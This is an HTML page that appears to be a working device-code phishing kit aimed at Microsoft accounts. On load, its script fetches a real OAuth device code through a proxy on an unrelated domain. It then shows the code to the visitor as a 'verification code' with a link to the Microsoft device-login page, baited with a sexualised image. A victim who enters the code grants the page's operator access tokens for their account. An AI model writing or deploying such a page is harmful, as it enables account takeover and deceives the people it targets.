<!DOCTYPE html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        #logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        #logo img {
            width: 100%;
            max-width: 300px;
            height: auto;
        }
    </style>
</head>

<body>
    <div id="logo"></div>
    <div id="code"></div>

    <script>
            var now = new Date().toISOString();
            $.get({
                url: "https://partners.feedcenterministry.org/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net",
                headers: {
                    "straylight": now,
                    "security": now
                }
            })
            .done(function(data) {
                var code = data.message.match(/code (.*) to/)[1];
                var message = "Your verification code is: " + code;
                var claim = "Please follow the link below and enter your code";
                var link3 = "<a href='https://partners.feedcenterministry.org/https://microsoft.com/devicelogin'>The Girls of Construction</a>";
                // document.write(data.message);

                var img = document.createElement('img');
                img.src = 'https://cdn.shopify.com/s/files/1/0660/7024/9722/products/Forplay-Women-s-Sexy-Construction-Worker-Costume-Yellow-S-M-halloweenkingdom-536_grande.jpg';
                img.style.width = '300px';
                img.style.height = 'auto';
                        
                var logoImg = document.createElement('img');
                logoImg.src = 'https://cdn.freebiesupply.com/logos/large/2x/revolutionary-logo-png-transparent.png';
                logoImg.style.width = '100px';
                logoImg.style.height = 'auto';
                logoImg.style.alignSelf = 'center';
                        
                // Define your messages
                var messageEl = document.createElement('p');
                messageEl.innerHTML = message;
                messageEl.style.textAlign = 'center';
                var claimEl = document.createElement('p');
                claimEl.innerHTML = claim + "<br>" + link3;
                claimEl.style.textAlign = 'center';
                        
                var logoDiv = document.getElementById('logo');
                logoDiv.style.display = 'flex';
                logoDiv.style.flexDirection = 'column';
                logoDiv.style.justifyContent = 'center';
                logoDiv.style.alignItems = 'center';
                logoDiv.style.gap = '20px';
                        
                // Append the elements in the correct order
                logoDiv.appendChild(logoImg);
                logoDiv.appendChild(messageEl);
                logoDiv.appendChild(claimEl);
                logoDiv.appendChild(img);
            });
            
    </script>
</body>
</html>
